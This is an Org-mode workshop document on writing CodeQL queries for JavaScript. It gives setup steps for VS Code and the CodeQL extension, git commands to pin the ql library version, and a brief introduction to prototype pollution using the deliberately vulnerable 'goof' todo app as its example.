javascript/codeql-js-goof-workshop/workshop.org
# -*- coding: utf-8 -*-
# Created 2020-10-19 Mon 14:11
#+TITLE: CodeQL workshop for javascript
#+AUTHOR: Michael Hohn
#+LANGUAGE:  en
#+TEXT:      
#+OPTIONS: ^:{} H:2 num:t \n:nil @:t ::t |:t ^:nil f:t *:t TeX:t LaTeX:t skip:nil p:nil
#+OPTIONS: toc:nil
#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="./l3style.css"/>
#+HTML: <div id="toc">
#+TOC: headlines 2        insert TOC here, with two headline levels
#+HTML: </div> 
# 
#+HTML: <div id="org-content">

* Setup instructions for Visual Studio Code
  To run CodeQL queries offline, follow these steps:

  1. Install the Visual Studio Code IDE.
  2. Download and install the [[https://help.semmle.com/codeql/codeql-for-vscode.html][CodeQL extension for Visual Studio Code]]. Full setup
     instructions are [[https://help.semmle.com/codeql/codeql-for-vscode/procedures/setting-up.html][here]].
  3. [[https://help.semmle.com/codeql/codeql-for-vscode/procedures/setting-up.html#using-the-starter-workspace][Set up the starter workspace]].
     - *Important*: Don't forget to =git clone --recursive= or =git submodule
       update --init --remote=, so that you obtain the standard query libraries.
  4. Open the starter workspace: File > Open Workspace > Browse to
     =vscode-codeql-starter/vscode-codeql-starter.code-workspace=.

* Download the workshop zip file
  The [[https://drive.google.com/file/d/1eTHIFXO4AThVmI1eHdS2oi6caeDEkilD/view?usp=sharing][codeql-js-goof-workshop.zip]] file contains these instructions, the codeql
  database, and a directory with the codeql samples we will develop during the
  workshop.  You can use the codeql samples directory as-is by adding it to your
  workspace.

* Setting up your environment
  In case of ql library version errors when trying to run a query, try to set your
  environment to match the one for this workshop by setting the ql library version
  to v1.25.0:

  - For a standalone ql tree, something like this
    #+BEGIN_SRC sh
    cd ~/local/vmsync/ql
    git checkout -b mh-v1.25.0 v1.25.0
    #+END_SRC

  - For ql in the starter workspace:
    #+BEGIN_SRC sh
      cd ~/local/vscode-codeql-starter
      git pull
      git submodule update            # avoid database scheme mismatch
      git checkout -b mh-v1.25.0 origin/1.25.0
    #+END_SRC

* CodeQL workshop for javascript, Part 1: Identify the Problem
  Before any queries can be written, we 
  1. should be certain that the application has a vulnerability and
  2. we have to identify the parts of the application's source code affected by
     it.
  

** The Prototype Pollution Problem
   In this workshop, we focus on Javascript Prototype Pollution.

   Prototype pollution is a type of vulnerability in which an attacker is able to
   modify =Object.prototype=.  This can happen when recursively merging a
   user-controlled object into another object, allowing an attacker to
   modify the built-in Object prototype.  Once that is done, later requests can
   abuse the new property, e.g. to gain access to parts of a system.

   This is best illustrated via example; the all-in-one vulnerable app, [[https://github.com/snyk/goof][goof]],
   provides a good sample for prototype injection in a web app.  It labels itself
   as the /Super vulnerable todo list application/, and has samples for seeing
   those vulnerabilities in action.

